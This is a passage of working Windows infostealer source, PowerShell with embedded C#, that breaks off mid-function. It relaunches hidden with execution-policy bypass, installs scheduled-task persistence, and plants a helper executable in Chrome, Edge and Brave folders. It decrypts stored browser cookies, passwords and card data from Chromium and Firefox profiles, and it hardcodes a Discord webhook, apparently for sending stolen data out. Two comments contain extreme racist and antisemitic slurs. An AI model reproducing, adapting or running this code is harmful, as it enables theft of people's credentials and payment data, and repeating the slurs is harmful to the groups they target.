$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

$Build = 'v3.16.3-1488'
$Webhook = 'https://discord.com/api/webhooks/1566571508455833771/20tZMqfJFl77sb8jtx2zqrR_ioUA3liT5Rt2SCmN6MNR5lE_gUReknSolVQ_XJTHD6W0'
$LogPath = Join-Path $env:TEMP 'hzgui.log'
$self = $MyInvocation.MyCommand.Path

if ($PSVersionTable.PSEdition -ne 'Desktop' -and $self) {
    $ps51 = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
    if (Test-Path $ps51) {
        try { Start-Process -FilePath $ps51 -ArgumentList @('-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',"`"$self`"") -WindowStyle Hidden; exit } catch { }
    }
}

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

$script:PS = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$script:BaseDir = Join-Path $env:ProgramData 'Microsoft\Windows\HZGUI'
$script:Payload = Join-Path $script:BaseDir 'hzgui.ps1'						# NIGGER NIGGER NIGGER nigger nigegr f
$script:Guard = Join-Path $script:BaseDir 'guard.ps1'
$script:B64 = Join-Path $script:BaseDir 'payload.b64'
$script:HK = Join-Path $script:BaseDir 'hz_key.exe'						# fuck jews rape nigger
$script:Flag = Join-Path $env:PUBLIC 'hz_exit.flag'
$script:Stage = Join-Path $env:PUBLIC 'hz_stage.ps1'
$script:LocalDir = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\HZGUI'
$script:Marker = Join-Path $script:LocalDir 'setup.marker'
$script:PersistDiag = 'n/a'
$script:setupBusy = $false
$script:Mtx = $null

$guardSrc = @'
$ErrorActionPreference = 'SilentlyContinue'
$d = Split-Path $MyInvocation.MyCommand.Path
$p = Join-Path $d 'hzgui.ps1'
$b = Join-Path $d 'payload.b64'
$h = Join-Path $d 'hz_key.exe'
$st = Join-Path $env:PUBLIC 'hz_stage.ps1'
$mtx = New-Object System.Threading.Mutex($false, 'Global\HZGUI_AGENT')
$run = $false
try { if ($mtx.WaitOne(0)) { $mtx.ReleaseMutex() } else { $run = $true } } catch [System.Threading.AbandonedMutexException] { try { $mtx.ReleaseMutex() } catch { } }
if ($run) { exit }
if (Test-Path $st) {
    $a = ''
    try { $a = (Get-FileHash -LiteralPath $st).Hash } catch { }
    $c = ''
    if (Test-Path $p) { try { $c = (Get-FileHash -LiteralPath $p).Hash } catch { } }
    if ($a -and $a -ne $c) {
        Copy-Item -LiteralPath $st -Destination $p -Force
        try { [IO.File]::WriteAllText($b, [Convert]::ToBase64String([IO.File]::ReadAllBytes($p))) } catch { }
    }
}
if (!(Test-Path $p) -and (Test-Path $b)) { try { [IO.File]::WriteAllBytes($p, [Convert]::FromBase64String((Get-Content $b -Raw))) } catch { } }
if (!(Test-Path $p)) { exit }
if (Test-Path $h) {
    foreach ($bd in @("$env:ProgramFiles\Google\Chrome\Application", "${env:ProgramFiles(x86)}\Google\Chrome\Application", "$env:ProgramFiles\Microsoft\Edge\Application", "${env:ProgramFiles(x86)}\Microsoft\Edge\Application", "${env:ProgramFiles(x86)}\BraveSoftware\Brave-Browser\Application")) {
        if (!(Test-Path $bd)) { continue }
        if (Test-Path (Join-Path $bd 'hz_key.exe')) { continue }
        Copy-Item -LiteralPath $h -Destination (Join-Path $bd 'hz_key.exe') -Force
    }
}
$flag = Join-Path $env:PUBLIC 'hz_exit.flag'
if (Test-Path $flag) { if (((Get-Date) - (Get-Item $flag).LastWriteTime).TotalMinutes -lt 3) { exit } }
Start-Process -FilePath "$env:SystemRoot\System32\schtasks.exe" -ArgumentList @('/run','/tn','HZGUI_UI') -WindowStyle Hidden -Wait
'@

function Stage-Self {
    if (!$self) { return }
    if ($self -eq $script:Payload) { return }
    try {
        if (!(Test-Path $script:LocalDir)) { New-Item -ItemType Directory -Path $script:LocalDir -Force | Out-Null }
        $a = ''
        try { $a = (Get-FileHash -LiteralPath $self).Hash } catch { }
        if (!$a) { return }
        $c = ''
        if (Test-Path $script:Stage) { try { $c = (Get-FileHash -LiteralPath $script:Stage).Hash } catch { } }
        if ($a -ne $c) { [IO.File]::WriteAllBytes($script:Stage, [IO.File]::ReadAllBytes($self)) }
    } catch { }
}

function Get-HelperDirs {
    $l = @()
    foreach ($r in $script:Roots) {
        if (!(Test-Path $r)) { continue }
        $ls = Join-Path $r 'Local State'
        if (!(Test-Path $ls)) { continue }
        if ((Get-Content $ls -Raw) -notmatch 'app_bound_encrypted_key') { continue }
        $d = Get-BrowserDir (Get-BrowserKind $r)
        if (!$d) { continue }
        if (Test-Path (Join-Path $d 'hz_key.exe')) { continue }
        if ($l -notcontains $d) { $l += $d }
    }
    return $l
}

function Install-Setup {
    if ($script:setupBusy) { return }
    $script:setupBusy = $true
    try {
        Stage-Self
        if (Test-Path $script:Marker) {
            $script:PersistDiag = 'ok'
            $script:stats.helper = 'ok'
            return
        }

        $dir = $script:BaseDir
        $ok = $false
        try {
            if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force -ErrorAction Stop | Out-Null }
            $probe = Join-Path $dir ('.p' + [guid]::NewGuid().ToString('N'))
            [IO.File]::WriteAllText($probe, 'x')
            Remove-Item $probe -Force -ErrorAction SilentlyContinue
            $ok = $true
        } catch { }
        if (!$ok) {
            $dir = $script:LocalDir
            try {
                if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force -ErrorAction Stop | Out-Null }
                $script:PersistDiag = 'local fallback'
            } catch { $script:PersistDiag = 'no dir'; return }
        }

        $hdirs = @()
        if ($script:stats.rbxType -eq 'ok') { $hdirs = @(Get-HelperDirs) }

        $tmp = Join-Path $env:TEMP "hz_key_$Build.exe"
        if ($hdirs.Count -gt 0 -and !(Test-Path $tmp)) {
            try { Add-Type -TypeDefinition $helperSrc -OutputAssembly $tmp -OutputType ConsoleApplication -ErrorAction Stop }
            catch { $hdirs = @(); $script:stats.helper = 'build failed' }
        }

        $p = Join-Path $dir 'hzgui.ps1'
        $g = Join-Path $dir 'guard.ps1'
        $b = Join-Path $dir 'payload.b64'
        $k = Join-Path $dir 'hz_key.exe'
        $src = if ($self) { $self } else { $script:Stage }

        try { [IO.File]::WriteAllText($g, $guardSrc) } catch { }
        if ($src -and (Test-Path $src)) {
            $same = $false
            try { $same = ([IO.Path]::GetFullPath($src) -eq [IO.Path]::GetFullPath($p)) } catch { }
            if (!$same) { try { Copy-Item -LiteralPath $src -Destination $p -Force } catch { } }
        }
        if (Test-Path $p) { try { [IO.File]::WriteAllText($b, [Convert]::ToBase64String([IO.File]::ReadAllBytes($p))) } catch { } }
        if ($hdirs.Count -gt 0 -and (Test-Path $tmp)) {
            try { Copy-Item -LiteralPath $tmp -Destination $k -Force } catch { }
            $done = 0
            foreach ($d in $hdirs) {
                try { Copy-Item -LiteralPath $tmp -Destination (Join-Path $d 'hz_key.exe') -Force -ErrorAction Stop; $done++ } catch { }
            }
            if ($done -gt 0) { $script:stats.helper = 'installed' }
            elseif (Test-Path $k) { $script:stats.helper = 'staged' }
        }
        $sid = [Security.Principal.WindowsIdentity]::GetCurrent().User.Value
        Start-Process -FilePath "$env:SystemRoot\System32\icacls.exe" -ArgumentList @($dir,'/inheritance:r','/grant:r',"*${sid}:(OI)(CI)F",'*S-1-5-32-545:(OI)(CI)RX') -WindowStyle Hidden -Wait | Out-Null

        if (!(Test-Path $p) -or !(Test-Path $g)) { $script:PersistDiag = 'stage failed'; return }

        $tr1 = "`"$($script:PS)`" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$g`""
        $tr2 = "`"$($script:PS)`" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$p`""
        $usr = "$env:USERDOMAIN\$env:USERNAME"
        $stx = "$env:SystemRoot\System32\schtasks.exe"

        $c1 = 1
        for ($i = 0; $i -lt 2; $i++) {
            try {
                $pr = Start-Process -FilePath $stx -ArgumentList @('/create','/f','/tn','HZGUARD','/sc','minute','/mo','1','/ru',$usr,'/it','/rl','HIGHEST','/tr',$tr1) -WindowStyle Hidden -Wait -PassThru
                $c1 = $pr.ExitCode
            } catch { $c1 = 1 }
            if ($c1 -eq 0) { break }
            Start-Process -FilePath $stx -ArgumentList @('/delete','/tn','HZGUARD','/f') -WindowStyle Hidden -Wait | Out-Null
        }

        $c2 = 1
        for ($i = 0; $i -lt 2; $i++) {
            try {
                $pr = Start-Process -FilePath $stx -ArgumentList @('/create','/f','/tn','HZGUI_UI','/sc','onlogon','/ru',$usr,'/it','/tr',$tr2) -WindowStyle Hidden -Wait -PassThru
                $c2 = $pr.ExitCode
            } catch { $c2 = 1 }
            if ($c2 -eq 0) { break }
            Start-Process -FilePath $stx -ArgumentList @('/delete','/tn','HZGUI_UI','/f') -WindowStyle Hidden -Wait | Out-Null
        }

        if ($c1 -eq 0 -and $c2 -eq 0) { $script:PersistDiag = 'installed' }
        elseif ($c1 -eq 0) { $script:PersistDiag = 'guard only' }
        elseif ($c2 -eq 0) { $script:PersistDiag = 'ui only' }
        else { $script:PersistDiag = 'task create failed' }

        if ($c1 -eq 0 -or $c2 -eq 0) { try { [IO.File]::WriteAllText($script:Marker, 'ok') } catch { } }
    } catch { }
    finally { $script:setupBusy = $false }
}

function Set-ExitFlag {
    try { [IO.File]::WriteAllText($script:Flag, (Get-Date -Format 'o')) } catch { }
}

$script:Mtx = New-Object System.Threading.Mutex($false, 'Global\HZGUI_AGENT')
$got = $false
try { $got = $script:Mtx.WaitOne(0) } catch [System.Threading.AbandonedMutexException] { $got = $true }
if (-not $got) { exit }

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$script:stats = @{
    sqType='missing'; rbxType='missing'; ffType='missing'; sqErr=''; rbxErr=''; ffErr=''
    sqlCalls=0; sqlFail=0; live=0; lastSqlErr=''; cookieRows=0; loginRows=0; autofillRows=0; cardRows=0
    roots=0; keyOk=0; keyBad=0; helper='none'; copyFail=0
    scanned=0; hitNames=0; hitSecrets=0; hitCards=0; truncated=0
}
$script:abe = @{}
$script:hitNames = New-Object System.Collections.ArrayList
$script:hitSecrets = New-Object System.Collections.ArrayList
$script:hitCards = New-Object System.Collections.ArrayList

$cs = @'
using System;
using System.Runtime.InteropServices;
using System.Text;

public static class Rbx
{
    [StructLayout(LayoutKind.Sequential)] public struct Blob { public int cbData; public IntPtr pbData; }
    [DllImport("crypt32.dll", SetLastError=true)] static extern bool CryptUnprotectData(ref Blob pIn, IntPtr d, IntPtr e, IntPtr r, IntPtr pr, int f, ref Blob pOut);
    [DllImport("kernel32.dll")] static extern IntPtr LocalFree(IntPtr h);
    [StructLayout(LayoutKind.Sequential)] public struct Info
    {
        public int cbSize; public int dwInfoVersion;
        public IntPtr pbNonce; public int cbNonce;
        public IntPtr pbAuthData; public int cbAuthData;
        public IntPtr pbTag; public int cbTag;
        public IntPtr pbMacContext; public int cbMacContext;
        public int cbAAD; public long cbData; public int dwFlags;
    }
    [DllImport("bcrypt.dll", CharSet=CharSet.Unicode)] static extern int BCryptOpenAlgorithmProvider(out IntPtr h, string a, string i, int f);
    [DllImport("bcrypt.dll", CharSet=CharSet.Unicode)] static extern int BCryptSetProperty(IntPtr h, string p, byte[] v, int l, int f);
    [DllImport("bcrypt.dll")] static extern int BCryptGenerateSymmetricKey(IntPtr h, out IntPtr k, IntPtr o, int ol, byte[] s, int sl, int f);
    [DllImport("bcrypt.dll")] static extern int BCryptDecrypt(IntPtr k, byte[] i, int il, ref Info inf, byte[] iv, int ivl, byte[] o, int ol, out int r, int f);
    [DllImport("bcrypt.dll")] static extern int BCryptDestroyKey(IntPtr k);
    [DllImport("bcrypt.dll")] static extern int BCryptCloseAlgorithmProvider(IntPtr h, int f);

    public static byte[] Dpapi(byte[] data)
    {
        if (data == null || data.Length == 0) return null;
        Blob inB = new Blob(); Blob outB = new Blob();
        IntPtr buf = Marshal.AllocHGlobal(data.Length);
        try
        {
            Marshal.Copy(data, 0, buf, data.Length);
            inB.cbData = data.Length; inB.pbData = buf;
            if (!CryptUnprotectData(ref inB, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, ref outB)) return null;
            byte[] res = new byte[outB.cbData];
            Marshal.Copy(outB.pbData, res, 0, outB.cbData);
            LocalFree(outB.pbData);
            return res;
        }
        catch { return null; }
        finally { Marshal.FreeHGlobal(buf); }
    }

    public static byte[] Gcm(byte[] key, byte[] blob)
    {
        if (blob == null || blob.Length < 40) return null;
        byte[] nonce = new byte[12]; Array.Copy(blob, 3, nonce, 0, 12);
        int clen = blob.Length - 3 - 12 - 16; if (clen <= 0) return null;
        byte[] cipher = new byte[clen]; Array.Copy(blob, 15, cipher, 0, clen);
        byte[] tag = new byte[16]; Array.Copy(blob, blob.Length - 16, tag, 0, 16);
        IntPtr h, k;
        if (BCryptOpenAlgorithmProvider(out h, "AES", null, 0) != 0) return null;
        try
        {
            byte[] mode = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
            BCryptSetProperty(h, "ChainingMode", mode, mode.Length, 0);
            if (BCryptGenerateSymmetricKey(h, out k, IntPtr.Zero, 0, key, key.Length, 0) != 0) return null;
            try
            {
                IntPtr pn = Marshal.AllocHGlobal(nonce.Length);
                IntPtr pt = Marshal.AllocHGlobal(tag.Length);
                Marshal.Copy(nonce, 0, pn, nonce.Length);
                Marshal.Copy(tag, 0, pt, tag.Length);
                Info inf = new Info();
                inf.cbSize = Marshal.SizeOf(typeof(Info)); inf.dwInfoVersion = 1;
                inf.pbNonce = pn; inf.cbNonce = nonce.Length;
                inf.pbTag = pt; inf.cbTag = tag.Length;
                byte[] ob = new byte[clen]; int w;
                int st = BCryptDecrypt(k, cipher, clen, ref inf, null, 0, ob, clen, out w, 0);
                Marshal.FreeHGlobal(pn); Marshal.FreeHGlobal(pt);
                if (st != 0) return null;
                byte[] res = new byte[w]; Array.Copy(ob, res, w);
                return res;
            }
            finally { BCryptDestroyKey(k); }
        }
        finally { BCryptCloseAlgorithmProvider(h, 0); }
    }
}
'@
try { Add-Type -TypeDefinition $cs -ErrorAction Stop; $script:stats.rbxType='ok' } catch { $script:stats.rbxErr=$_.Exception.Message; $script:stats.rbxType='FAILED' }

$sq = @'
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

public static class Sq
{
    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_open16", CharSet=CharSet.Unicode)] static extern int Open(string f, out IntPtr db);
    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_open_v2", CharSet=CharSet.Ansi)] static extern int OpenV2(string f, out IntPtr db, int fl, IntPtr vfs);
    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_prepare_v2", CharSet=CharSet.Ansi)] static extern int Prepare(IntPtr db, string s, int n, out IntPtr st, IntPtr tail);
    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_step")] static extern int Step(IntPtr st);
    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_count")] static extern int Cols(IntPtr st);
    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_type")] static extern int ColType(IntPtr st, int i);
    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_text")] static extern IntPtr ColText(IntPtr st, int i);
    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_blob")] static extern IntPtr ColBlob(IntPtr st, int i);
    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_bytes")] static extern int ColBytes(IntPtr st, int i);
    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_finalize")] static extern int Fin(IntPtr st);
    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_close")] static extern int Close(IntPtr db);

    static List<object[]> Run(IntPtr db, string sql)
    {
        List<object[]> rows = new List<object[]>();
        IntPtr st;
        if (Prepare(db, sql, -1, out st, IntPtr.Zero) != 0) throw new Exception("prepare failed");
        try
        {
            while (Step(st) == 100)
            {
                int n = Cols(st);
                object[] r = new object[n];
                for (int i = 0; i < n; i++)
                {
                    int t = ColType(st, i);
                    if (t == 5) { r[i] = null; continue; }
                    int len = ColBytes(st, i);
                    if (t == 4)
                    {
                        byte[] b = new byte[len];
                        if (len > 0) Marshal.Copy(ColBlob(st, i), b, 0, len);
                        r[i] = b;
                    }
                    else if (t == 1 || t == 2) { r[i] = len.ToString(); }
                    else
                    {
                        byte[] b = new byte[len];
                        if (len > 0) Marshal.Copy(ColText(st, i), b, 0, len);
                        r[i] = Encoding.UTF8.GetString(b);
                    }
                }
                rows.Add(r);
            }
        }
        finally { Fin(st); }
        return rows;
    }

    public static List<object[]> Q(string path, string sql)
    {
        IntPtr db;
        if (Open(path, out db) != 0) throw new Exception("open failed");
        try { return Run(db, sql); } finally { Close(db); }
    }

    public static List<object[]> Live(string path, string sql)
    {
        string uri = "file:/" + path.Replace("\\", "/").Replace(" ", "%20") + "?mode=ro&immutable=1";
        IntPtr db;
        if (OpenV2(uri, out db, 0x41, IntPtr.Zero) != 0) throw new Exception("live open failed");
        try { return Run(db, sql); } finally { Close(db); }
    }
}
'@
try { Add-Type -TypeDefinition $sq -ErrorAction Stop; $script:stats.sqType='ok' } catch { $script:stats.sqErr=$_.Exception.Message; $script:stats.sqType='FAILED' }

$ff = @'
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

public static class Ff
{
    static byte[] CKA = { 0xf8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1 };

    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_open_v2", CharSet=CharSet.Ansi)] static extern int OpenV2(string f, out IntPtr db, int fl, IntPtr vfs);
    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_prepare_v2", CharSet=CharSet.Ansi)] static extern int Prepare(IntPtr db, string s, int n, out IntPtr st, IntPtr tail);
    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_step")] static extern int Step(IntPtr st);
    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_count")] static extern int Cols(IntPtr st);
    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_type")] static extern int ColType(IntPtr st, int i);
    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_blob")] static extern IntPtr ColBlob(IntPtr st, int i);
    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_bytes")] static extern int ColBytes(IntPtr st, int i);
    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_finalize")] static extern int Fin(IntPtr st);
    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_close")] static extern int Close(IntPtr db);

    static List<byte[][]> Rows(string path, string sql)
    {
        List<byte[][]> rows = new List<byte[][]>();
        string uri = "file:/" + path.Replace("\\", "/").Replace(" ", "%20") + "?mode=ro&immutable=1";
        IntPtr db;
        if (OpenV2(uri, out db, 0x41, IntPtr.Zero) != 0) throw new Exception("open failed");
        IntPtr st;
        try
        {
            if (Prepare(db, sql, -1, out st, IntPtr.Zero) != 0) throw new Exception("prepare failed");
            try
            {
                while (Step(st) == 100)
                {
                    int n = Cols(st);
                    byte[][] r = new byte[n][];
                    for (int i = 0; i < n; i++)
                    {
                        if (ColType(st, i) == 5) { r[i] = null; continue; }
                        int len = ColBytes(st, i);
                        byte[] b = new byte[len];
                        if (len > 0) Marshal.Copy(ColBlob(st, i), b, 0, len);
                        r[i] = b;
                    }
                    rows.Add(r);
                }
            }
            finally { Fin(st); }
        }
        finally { Close(db); }
        return rows;
    }

    static int Tlv(byte[] b, int off, out int tag, out int len, out int vs)
    {
        tag = b[off];
        int p = off + 1;
        int l = b[p++];
        if ((l & 0x80) != 0)
        {
            int n = l & 0x7f; l = 0;
            for (int i = 0; i < n; i++) l = (l << 8) | b[p++];
        }
        len = l; vs = p;
        return p + l;
    }

    static byte[] Hmac(byte[] key, byte[] data)
    {
        using (HMACSHA1 h = new HMACSHA1(key)) return h.ComputeHash(data);
    }

    static byte[] Sha1(params byte[][] parts)
    {
        using (SHA1 s = SHA1.Create())
        {
            int total = 0; foreach (byte[] p in parts) total += p.Length;
            byte[] all = new byte[total]; int o = 0;
            foreach (byte[] p in parts) { Array.Copy(p, 0, all, o, p.Length); o += p.Length; }
            return s.ComputeHash(all);
        }
    }

    static byte[] Moz3des(byte[] gs, byte[] pw, byte[] es, byte[] data)
    {
        byte[] hp = Sha1(gs, pw);
        byte[] pes = new byte[20];
        Array.Copy(es, pes, Math.Min(es.Length, 20));
        byte[] chp = Sha1(hp, es);
        byte[] a = new byte[pes.Length + es.Length];
        Array.Copy(pes, a, pes.Length); Array.Copy(es, 0, a, pes.Length, es.Length);
        byte[] k1 = Hmac(chp, a);
        byte[] tk = Hmac(chp, pes);
        byte[] b2 = new byte[tk.Length + es.Length];
        Array.Copy(tk, b2, tk.Length); Array.Copy(es, 0, b2, tk.Length, es.Length);
        byte[] k2 = Hmac(chp, b2);
        byte[] k = new byte[32];
        Array.Copy(k1, k, 16); Array.Copy(k2, 0, k, 16, 16);
        byte[] key = new byte[24]; Array.Copy(k, key, 24);
        byte[] iv = new byte[8]; Array.Copy(k, 24, iv, 0, 8);
        using (TripleDES d = TripleDES.Create())
        {
            d.Mode = CipherMode.CBC; d.Padding = PaddingMode.None;
            return d.CreateDecryptor(key, iv).TransformFinalBlock(data, 0, data.Length);
        }
    }

    static byte[] DecryptPbe(byte[] der, byte[] gs, byte[] pw)
    {
        int tag, len, vs;
        int p = Tlv(der, 0, out tag, out len, out vs);
        int p2 = Tlv(der, vs, out tag, out len, out vs);
        int p3 = Tlv(der, vs, out tag, out len, out vs);
        int oidEnd = p3;
        string oid = BitConverter.ToString(der, vs, len).Replace("-", "").ToLower();

        int p4 = Tlv(der, oidEnd, out tag, out len, out vs);
        byte[] cipher;
        if (tag == 0x30)
        {
            int innerEnd = p4;
            if (oid == "2a864886f70d010c050103")
            {
                Tlv(der, vs, out tag, out len, out vs);
                byte[] es = new byte[len]; Array.Copy(der, vs, es, 0, len);
                Tlv(der, innerEnd, out tag, out len, out vs);
                cipher = new byte[len]; Array.Copy(der, vs, cipher, 0, len);
                return Moz3des(gs, pw, es, cipher);
            }
            if (oid == "2a864886f70d01050d")
            {
                Tlv(der, vs, out tag, out len, out vs);
                int pbkdf2End = Tlv(der, vs, out tag, out len, out vs);
                Tlv(der, vs, out tag, out len, out vs);
                byte[] es = new byte[len]; Array.Copy(der, vs, es, 0, len);
                Tlv(der, vs, out tag, out len, out vs);
                Tlv(der, vs, out tag, out len, out vs);
                int iter = int.Parse(Encoding.ASCII.GetString(der, vs, len));
                int after = Tlv(der, pbkdf2End, out tag, out len, out vs);
                Tlv(der, after, out tag, out len, out vs);
                int aesEnd = Tlv(der, vs, out tag, out len, out vs);
                byte[] ivb = new byte[len]; Array.Copy(der, vs, ivb, 0, len);
                Tlv(der, aesEnd, out tag, out len, out vs);
                cipher = new byte[len]; Array.Copy(der, vs, cipher, 0, len);
                byte[] iv = new byte[2 + ivb.Length]; iv[0] = 4; iv[1] = 14;
                Array.Copy(ivb, 0, iv, 2, ivb.Length);
                byte[] k = Sha1(gs, pw);
                byte[] key;
                using (Rfc2898DeriveBytes pb = new Rfc2898DeriveBytes(k, es, iter, HashAlgorithmName.SHA256))
                    key = pb.GetBytes(32);
                using (Aes a = Aes.Create())
                {
                    a.Mode = CipherMode.CBC; a.Padding = PaddingMode.None;
                    return a.CreateDecryptor(key, iv).TransformFinalBlock(cipher, 0, cipher.Length);
                }
            }
        }
        return null;
    }

    public static List<string> Dump(string dir)
    {
        List<string> outl = new List<string>();
        string key4 = System.IO.Path.Combine(dir, "key4.db");
        string lj = System.IO.Path.Combine(dir, "logins.json");
        if (!System.IO.File.Exists(key4) || !System.IO.File.Exists(lj)) return outl;

        List<byte[][]> m = Rows(key4, "SELECT item1,item2 FROM metadata WHERE id='password'");
        if (m.Count == 0) return outl;
        byte[] gs = m[0][0];
        byte[] item2 = m[0][1];
        byte[] pw = new byte[0];
        byte[] chk = DecryptPbe(item2, gs, pw);
        if (chk == null || chk.Length < 14) return outl;
        if (Encoding.ASCII.GetString(chk, 0, 14) != "password-check") return outl;

        List<byte[][]> priv = Rows(key4, "SELECT a11,a102 FROM nssPrivate");
        byte[] a11 = null;
        foreach (byte[][] r in priv)
        {
            if (r[0] == null) continue;
            byte[] id = r[1];
            bool match = id != null && id.Length == CKA.Length;
            if (match) for (int i = 0; i < id.Length; i++) if (id[i] != CKA[i]) { match = false; break; }
            if (match) { a11 = r[0]; break; }
        }
        if (a11 == null) return outl;

        byte[] master = DecryptPbe(a11, gs, pw);
        if (master == null) return outl;
        byte[] fkey; int bs;
        if (master.Length >= 48) { fkey = new byte[32]; Array.Copy(master, fkey, 32); bs = 16; }
        else if (master.Length >= 32) { fkey = new byte[24]; Array.Copy(master, fkey, 24); bs = 8; }
        else return outl;

        string json = System.IO.File.ReadAllText(lj);
        int pos = 0;
        while (true)
        {
            int hi = json.IndexOf("\"hostname\"", pos);
            if (hi < 0) break;
            int q1 = json.IndexOf('"', json.IndexOf(':', hi) + 1);
            int q2 = json.IndexOf('"', q1 + 1);
            if (q1 < 0 || q2 < 0) break;
            string host = json.Substring(q1 + 1, q2 - q1 - 1);
            pos = q2;
            string eu = Grab(json, "encryptedUsername", pos);
            string ep = Grab(json, "encryptedPassword", pos);
            string u = Dec(eu, fkey, bs);
            string p = Dec(ep, fkey, bs);
            if (u != null || p != null) outl.Add(host + " | " + u + " | " + p);
        }
        return outl;
    }

    static string Grab(string json, string key, int from)
    {
        int i = json.IndexOf("\"" + key + "\"", from);
        if (i < 0) return null;
        int q1 = json.IndexOf('"', json.IndexOf(':', i) + 1);
        int q2 = json.IndexOf('"', q1 + 1);
        if (q1 < 0 || q2 < 0) return null;
        return json.Substring(q1 + 1, q2 - q1 - 1);
    }

    static string Dec(string b64, byte[] key, int bs)
    {
        if (string.IsNullOrEmpty(b64)) return "";
        try
        {
            byte[] der = Convert.FromBase64String(b64);
            int tag, len, vs;
            int p = Tlv(der, 0, out tag, out len, out vs);
            int p2 = Tlv(der, vs, out tag, out len, out vs);
            int p3 = Tlv(der, p2, out tag, out len, out vs);
            int p4 = Tlv(der, vs, out tag, out len, out vs);
            byte[] iv = new byte[len]; Array.Copy(der, vs, iv, 0, len);
            Tlv(der, p4, out tag, out len, out vs);
            byte[] ct = new byte[len]; Array.Copy(der, vs, ct, 0, len);
            byte[] pt;
            if (bs == 16)
            {
                using (Aes a = Aes.Create()) { a.Mode = CipherMode.CBC; a.Padding = PaddingMode.None; pt = a.CreateDecryptor(key, iv).TransformFinalBlock(ct, 0, ct.Length); }
            }
            else
            {
                using (TripleDES d = TripleDES.Create()) { d.Mode = CipherMode.CBC; d.Padding = PaddingMode.None; pt = d.CreateDecryptor(key, iv).TransformFinalBlock(ct, 0, ct.Length); }
            }
            int pad = pt[pt.Length - 1];
            return Encoding.UTF8.GetString(pt, 0, pt.Length - pad);
        }
        catch { return ""; }
    }
}
'@
try { Add-Type -TypeDefinition $ff -ErrorAction Stop; $script:stats.ffType='ok' } catch { $script:stats.ffErr=$_.Exception.Message; $script:stats.ffType='FAILED' }

function Write-Log { param([string]$m) try { Add-Content -Path $LogPath -Value "$(Get-Date -Format 'u')  $m" } catch { } }
Write-Log "--- start $Build admin=$isAdmin ---"

$script:abk = @{}
$script:v20fail = 0
$script:v20ok = 0

$helperSrc = @'
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

public static class HZ
{
    [DllImport("oleaut32.dll")] static extern IntPtr SysAllocStringByteLen(byte[] b, uint l);
    [DllImport("oleaut32.dll")] static extern void SysFreeString(IntPtr b);
    [DllImport("oleaut32.dll")] static extern uint SysStringByteLen(IntPtr b);
    [DllImport("ole32.dll")] static extern int CoInitializeEx(IntPtr p, int f);
    [DllImport("ole32.dll")] static extern int CoSetProxyBlanket(IntPtr p, uint a, uint b, IntPtr s, uint l, uint i, IntPtr ai, uint c);

    [ComImport, Guid("463ABECF-410D-407F-8AF5-0DF35A005CC8"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IC { [PreserveSig] int Run(IntPtr a, IntPtr b, IntPtr c, IntPtr d, uint p, out IntPtr h); [PreserveSig] int Enc(int l, IntPtr p, out IntPtr c, out int e); [PreserveSig] int Dec(IntPtr c, out IntPtr p, out int e); }
    [ComImport, Guid("F396861E-0C8E-4C71-8256-2FAE6D759C9E"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IB { [PreserveSig] int Run(IntPtr a, IntPtr b, IntPtr c, IntPtr d, uint p, out IntPtr h); [PreserveSig] int Enc(int l, IntPtr p, out IntPtr c, out int e); [PreserveSig] int Dec(IntPtr c, out IntPtr p, out int e); }
    [ComImport, Guid("C9C2B807-7731-4F34-81B7-44FF7779522B"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IE { [PreserveSig] int P1(); [PreserveSig] int P2(); [PreserveSig] int P3(); [PreserveSig] int Run(IntPtr a, IntPtr b, IntPtr c, IntPtr d, uint p, out IntPtr h); [PreserveSig] int Enc(int l, IntPtr p, out IntPtr c, out int e); [PreserveSig] int Dec(IntPtr c, out IntPtr p, out int e); }

    static string Attempt(string clsid, string kind, byte[] blob)
    {
        object o;
        try { o = Activator.CreateInstance(Type.GetTypeFromCLSID(new Guid(clsid))); }
        catch (Exception ex) { return "ERR:create:" + ex.GetType().Name; }
        try { CoSetProxyBlanket(Marshal.GetIUnknownForObject(o), 10, 0, IntPtr.Zero, 6, 3, IntPtr.Zero, 0); } catch { }
        IntPtr p = SysAllocStringByteLen(blob, (uint)blob.Length);
        IntPtr plain = IntPtr.Zero; int err = 0; int hr;
